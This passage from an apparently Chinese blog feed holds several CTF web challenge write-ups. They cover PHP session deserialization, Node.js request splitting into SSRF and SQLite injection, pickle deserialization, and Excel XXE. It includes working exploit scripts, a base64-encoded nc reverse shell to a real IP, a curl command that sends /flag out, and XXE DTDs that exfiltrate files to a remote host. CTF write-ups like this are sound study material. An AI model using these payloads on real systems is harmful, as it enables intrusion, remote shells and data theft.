class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PhpSession</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IFormat</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>): <span class="hljs-title">string</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-variable">$result</span> .= <span class="hljs-variable">$k</span> . <span class="hljs-string">&#x27;|&#x27;</span> . serialize(<span class="hljs-variable">$v</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$result</span> = [];<br>        <span class="hljs-variable">$offset</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$length</span> = \strlen(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$offset</span> &lt; <span class="hljs-variable">$length</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (!strstr(substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$offset</span>), <span class="hljs-string">&#x27;|&#x27;</span>))<br>            &#123;<br>                <span class="hljs-keyword">return</span> [];<br>            &#125;<br>            <span class="hljs-variable">$pos</span> = strpos(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$offset</span>);<br>            <span class="hljs-variable">$num</span> = <span class="hljs-variable">$pos</span> - <span class="hljs-variable">$offset</span>;<br>            <span class="hljs-variable">$varname</span> = substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$offset</span>, <span class="hljs-variable">$num</span>);<br>            <span class="hljs-variable">$offset</span> += <span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>;<br>            <span class="hljs-variable">$dataItem</span> = unserialize(substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$offset</span>));<br>            <span class="hljs-variable">$result</span>[<span class="hljs-variable">$varname</span>] = <span class="hljs-variable">$dataItem</span>;<br>            <span class="hljs-variable">$offset</span> += \strlen(serialize(<span class="hljs-variable">$dataItem</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>例如我们插入的数据，从结果上看明显反序列化出来了我们的<code>[]</code></p><p><img src="https://img-blog.csdnimg.cn/e49909403b2149d5bf44fae81aa02f74.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>接下来就是找链子，最开始我想的是这不就直接<code>LazyString</code>中触发<code>toString</code>，参数赋值一个闭包函数。后来一直没通，发现我是憨批，它这里不和上面文件上传那个一样，因为上面的实现了对于闭包函数的序列化，这里无法对闭包函数进行序列化，所以无法将参数初始化。最终exp（这里还有个坑就是它是sh命令的架构，不能用bash反弹shell）：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">PhpOption</span>&#123;<br>    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Option</span>&#123;<br><br>        &#125;<br>    <span class="hljs-title">final</span> <span class="hljs-title">class</span> <span class="hljs-title">LazyOption</span> <span class="hljs-title">extends</span> <span class="hljs-title">Option</span>&#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">callback</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$arguments</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$option</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;arguments = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMzkuMTA3LjIzOS4zMCAyMzMzID4vdG1wL2YK | base64 -d|sh&quot;</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;callback = <span class="hljs-string">&quot;system&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">PhpOption</span>\<span class="hljs-title">LazyOption</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LazyString</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;value = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> LazyOption(),<span class="hljs-string">&quot;get&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br>$<span class="hljs-title">a</span> = <span class="hljs-title">new</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span>\<span class="hljs-title">LazyString</span>();<br><span class="hljs-variable">$p</span> = serialize(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-variable">$payload</span>  = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;e&quot;</span>=&gt;<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c|&quot;</span>.<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;a&quot;</span>=&gt;<span class="hljs-string">&quot;a&quot;</span>);<br>    <span class="hljs-comment">// var_dump($payload).&quot;\n&quot;;</span><br>    <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$payload</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/32ee3c5527be4ccfb52df760be15b3ac.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nodejs题目记录</title>
    <link href="/2022/01/10/2022-1-10-nodejs%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/01/10/2022-1-10-nodejs%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p>参考<a href="https://xz.aliyun.com/t/2894#toc-2">https://xz.aliyun.com/t/2894#toc-2</a></p><p><a href="https://r3billions.com/writeup-split-second/">出题人参考的题目</a></p><p><a href="http://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game">出题人自己思路</a></p><p>题目也挺老了感觉，这里的node版本为8，是存在http拆分请求攻击的。给了源码，审计一下。nodejs走私打ssrf。自己写的没打通，看网上有些也不打通，环境会崩，找了一个能打通。这里将字符unicode编码，因为node8采用的单字节latin编码，会将高字节位截掉，只剩下低字节位。也可用<code>global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag.txt&#39;);</code></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&quot;&quot;&quot; HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Connection: keep-alive</span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /file_upload HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: &#123;&#125;</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynWjDdj9HcJ7ILyVa</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;&#125;&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br><br>body = <span class="hljs-string">&quot;&quot;&quot;------WebKitFormBoundarynWjDdj9HcJ7ILyVa</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;</span><br><span class="hljs-string">Content-Type: ../template</span><br><span class="hljs-string"></span><br><span class="hljs-string">-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;)</span><br><span class="hljs-string">-return x</span><br><span class="hljs-string">------WebKitFormBoundarynWjDdj9HcJ7ILyVa--</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br><br>payload = payload.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(body), body) \<br>    .replace(<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;\u012b&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\u0120&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;\r\n&#x27;</span>, <span class="hljs-string">&#x27;\u010d\u010a&#x27;</span>)    \<br>    .replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\u0122&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;\u0a27&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;\u015b&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;\u015d&#x27;</span>) \<br>    + <span class="hljs-string">&#x27;GET&#x27;</span> + <span class="hljs-string">&#x27;\u0120&#x27;</span> + <span class="hljs-string">&#x27;/&#x27;</span>  <span class="hljs-comment">#闭合下一个请求</span><br><span class="hljs-built_in">print</span>(payload)<br>requests.get(<br>    <span class="hljs-string">&#x27;http://68d9e1b4-926e-4d78-974c-b5eed4e09526.node4.buuoj.cn:81/core?q=&#x27;</span> + payload)<br><br><span class="hljs-built_in">print</span>(requests.get(<br>    <span class="hljs-string">&#x27;http://68d9e1b4-926e-4d78-974c-b5eed4e09526.node4.buuoj.cn:81/?action=shell&#x27;</span>).text)<br></code></pre></div></td></tr></table></figure><h1 id="hackthebox-Weather-App"><a href="#hackthebox-Weather-App" class="headerlink" title="[hackthebox] Weather App"></a>[hackthebox] Weather App</h1><p>node考点一样但是多加了一个sqlite注入。</p><p>查询天气处存在http请求拆分打ssrf</p><p><img src="https://img-blog.csdnimg.cn/de3532e7f2754382822d63865613f97e.png" alt="在这里插入图片描述"></p><p>稍微改改上面的脚本。抓包将生成的payload发包，发现可接受到</p><p><img src="https://img-blog.csdnimg.cn/fae549d9f7f74697b9542fd34b9d9b5a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>sqlite中存在一个插入和一个查询操作</p><p><img src="https://img-blog.csdnimg.cn/81b6e4f18c1841d0906196c4489db839.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>这里利用<code>admin&#39; ON CONFLICT(username) DO UPDATE set password=&#39;123&#39;-+</code>来闭合插入语句，当插入存在冲突时自动更新密码</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br>payload = <span class="hljs-string">&quot;&quot;&quot; HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Connection: keep-alive</span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /register HTTP/1.1</span><br><span class="hljs-string">Host: 167.99.202.131:32102</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 85</span><br><span class="hljs-string"></span><br><span class="hljs-string">username=admin&amp;password=admin&#x27; ON CONFLICT(username) DO UPDATE set password=&#x27;123&#x27;-+</span><br><span class="hljs-string">&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br><br>payload = payload \<br>    .replace(<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;\u012b&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\u0120&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;\r\n&#x27;</span>, <span class="hljs-string">&#x27;\u010d\u010a&#x27;</span>)    \<br>    .replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\u0122&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;\u0a27&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;\u015b&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;\u015d&#x27;</span>)                \<br>    + <span class="hljs-string">&#x27;\u010d\u010aGET&#x27;</span> + <span class="hljs-string">&#x27;\u0120&#x27;</span> + <span class="hljs-string">&#x27;/&#x27;</span><br><br>data = &#123;<span class="hljs-string">&quot;endpoint&quot;</span>:<span class="hljs-string">f&#x27;127.0.0.1/xxx?p=1<span class="hljs-subst">&#123;payload&#125;</span>&#x27;</span>,<br>        <span class="hljs-string">&quot;city&quot;</span>:<span class="hljs-string">&quot;uk&quot;</span>,<br>        <span class="hljs-string">&quot;country&quot;</span>:<span class="hljs-string">&quot;London&quot;</span>&#125;<br><span class="hljs-comment"># print(json.dumps(data))</span><br>res = requests.post(<span class="hljs-string">&#x27;http://167.99.202.131:32102/api/weather&#x27;</span>,data=json.dumps(data),headers=&#123;<span class="hljs-string">&quot;Content-type&quot;</span>:<span class="hljs-string">&quot;application/json&quot;</span>,<br>                                                                                 <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span>&#125;)<br>flag = requests.post(<span class="hljs-string">&quot;http://167.99.202.131:32102/login&quot;</span>,data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(flag.text)<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/842d24145db140aaafec359b2a0ad2f2.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>nodejs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2021/11/16/2021-11-L3hctf/"/>
    <url>/2021/11/16/2021-11-L3hctf/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>强网拟态</title>
    <link href="/2021/11/07/2021-11-%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/"/>
    <url>/2021/11/07/2021-11-%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/</url>
    
    <content type="html"><![CDATA[<h3 id="zerocalc"><a href="#zerocalc" class="headerlink" title="zerocalc"></a>zerocalc</h3><p>题目提示readFile(“./src/index.js”)，所以尝试readFile(“/flag”)得到flag</p><p><img src="https://md.buptmerak.cn/uploads/upload_58b9e93800f31335dac6f874a29cfa1a.png" alt="img"></p><h3 id="new-hospital"><a href="#new-hospital" class="headerlink" title="new_hospital"></a>new_hospital</h3><p>扫描目录。可以发现/old/ 以及/flag.php。<br>然后通过awvs可以发现，在feature.php下有一个api会利用Cookie include文件。<br>发现/feature不是很好用，利用/old/feature.php来包含任意文件。直接包含/var/www/html/flag.php即可。</p><h3 id="EasyFilter"><a href="#EasyFilter" class="headerlink" title="EasyFilter"></a>EasyFilter</h3><p>提供了写入和读取两种操作，b64参数c之后写入文件内<br>写入之后会返回文件名，接下来的问题是怎么在包含时能够解码文件，因为读取时只能控制”resource=”后面的内容<br>构造<code>r=convert.base64-decode/../xxx</code><br>拼接后成为<code>php://filter/resource=./files/convert.base64-decode/../xxx</code><br>调用了转换过滤器的同时又把<code>convert.base64-decode</code>当成了一个文件名，加<code>../</code>进行目录穿越后包含到恶意代码(上面会有一堆报错，雀氏挺另类的)<br><img src="https://md.buptmerak.cn/uploads/upload_23403d8ce8b50e2a191d26e8bbbf55dd.png" alt="img"></p><h3 id="Jack-Shiro"><a href="#Jack-Shiro" class="headerlink" title="Jack-Shiro"></a>Jack-Shiro</h3><p>天翼杯原题，首先/;/绕过，然后<a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a>直接打<br><img src="https://md.buptmerak.cn/uploads/upload_fa14a8e59c7d21682ccfa66c4d509322.png" alt="img"><br><img src="https://md.buptmerak.cn/uploads/upload_7cfd9ce031a9680de9c4b5ac6c981662.png" alt="img"></p><h3 id="Give-me-your-0day"><a href="#Give-me-your-0day" class="headerlink" title="Give_me_your_0day"></a>Give_me_your_0day</h3><p>安装页面存在数据库连接操作，考虑用<a href="https://github.com/allyshka/Rogue-MySql-Server">rogue_mysql</a>搭建恶意mysql server，尝试后发现被forbidden了<img src="https://md.buptmerak.cn/uploads/upload_6fa66bf83711125947b7942d00635bd9.png" alt="img"><br>观察install.php后，发现题目提供了多个数据库选择。选择mysqli后成功得到flag<img src="https://md.buptmerak.cn/uploads/upload_9f0816d213c0d813ac6a973bae2a487a.png" alt="img"><br><img src="https://md.buptmerak.cn/uploads/upload_f94b19fd43118d06ecf04e9a01bfe0fa.png" alt="img"></p><h3 id="ezPickle"><a href="#ezPickle" class="headerlink" title="ezPickle"></a>ezPickle</h3><p>pickle反序列化题。在<code>config</code>中有后门，但是需要修改notadmin中的<code>admin</code>为<code>yes</code>。</p><figure class="highlight xquery"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xquery">Class RestrictedUnpickler(pickle.Unpickler):<br>    def find_class(self, <span class="hljs-keyword">module</span>,<span class="hljs-built_in"> name</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">module</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;config&#x27;</span>] <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;__&quot;</span><span class="hljs-built_in"> not</span> <span class="hljs-keyword">in</span><span class="hljs-built_in"> name</span>:<br>            <span class="hljs-keyword">return</span> getattr(sys.modules[<span class="hljs-keyword">module</span>],<span class="hljs-built_in"> name</span>)<br>        raise pickle.UnpicklingError(<span class="hljs-string">&quot;&#x27;%s.%s&#x27; not allowed&quot;</span> % (<span class="hljs-keyword">module</span>,<span class="hljs-built_in"> name</span>))<br></code></pre></div></td></tr></table></figure><p>观察发现限定了<code>c</code>操作符加载的<code>module</code>为<code>config</code>，手搓个覆盖, 并且执行后门。</p><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">cconfig<br>notadmin<br>(S<span class="hljs-string">&#x27;admin&#x27;</span><br>S<span class="hljs-string">&#x27;yes&#x27;</span><br>ucconfig<br>backdoor<br>(S<span class="hljs-string">&#x27;exec(&quot;import os;os.system(&#x27;</span>curl ip -d <span class="hljs-string">`cat /flag`</span><span class="hljs-string">&#x27;)&quot;)&#x27;</span><br>tR.<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网鼎杯java题</title>
    <link href="/2021/11/06/2021-11-%E7%BD%91%E9%BC%8E%E6%9D%AFjava%E9%A2%98/"/>
    <url>/2021/11/06/2021-11-%E7%BD%91%E9%BC%8E%E6%9D%AFjava%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-filejava"><a href="#网鼎杯-2020-filejava" class="headerlink" title="网鼎杯 2020 filejava"></a>网鼎杯 2020 filejava</h1><p><a href="https://www.4armed.co/blog/exploiting-xxe-with-excel/">https://www.4armed.co/blog/exploiting-xxe-with-excel/</a></p><p><a href="https://xz.aliyun.com/t/7747">https://xz.aliyun.com/t/7747</a></p><p>下载文件处有filename目录穿越，结合报错可知道源码位置从而dump下源码开始审计</p><p><img src="https://img-blog.csdnimg.cn/afd99418b023483389e6210ebb2497d1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/a2f5a947cd70454cb3c03923d962d22c.png" alt="在这里插入图片描述"></p><p>看到这里就很明显了，判断后缀名应该是xlsx，开头限制了为excel-，考的就是excel进行xxe攻击</p><p>最开始使用得是这种打法</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt;<br>&lt;!DOCTYPE ANY[<br>&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;<br>&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;vps:2122&#x2F;1.dtd&quot;&gt;<br>%remote;<br>%all;<br>]&gt;<br>&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;<br></code></pre></div></td></tr></table></figure><p>1.dtd为</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;vps:2122&#x2F;%file;&#39;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure><p>感觉都行的，但是怎么打也打不通，后来换了一下，</p><p><img src="https://img-blog.csdnimg.cn/5dc2c253ce9d42789fca303bd78f8296.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>file.dtd中为</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;39.107.239.30:3333?p&#x3D;%file;&#39;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/023f546407c845e48a269462caf19bde.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/74b606bf5867403eae11993a981078cd.png" alt="在这里插入图片描述"></p><h1 id="网鼎杯ThinkJava"><a href="#网鼎杯ThinkJava" class="headerlink" title="网鼎杯ThinkJava"></a>网鼎杯ThinkJava</h1><p>拼接导致注入漏洞</p><p><img src="https://img-blog.csdnimg.cn/36c3078bd52246ccabf5547d073cd4bd.png" alt="在这里插入图片描述"></p><p><code>myapp#&#39; union select pwd from user#</code>这里还需要保证前面的数据库连接正确</p><p><img src="https://img-blog.csdnimg.cn/7c3e1c471d344040ad211b3e5645ea0e.png" alt="在这里插入图片描述"></p><p>登录后发现提示，这里用burp分析发现是rome漏洞，直接一把梭</p><p><img src="https://img-blog.csdnimg.cn/accd2ef5f88f49d79e69d8f04458f597.png" alt="在这里插入图片描述"></p><p>生成payload</p><p><img 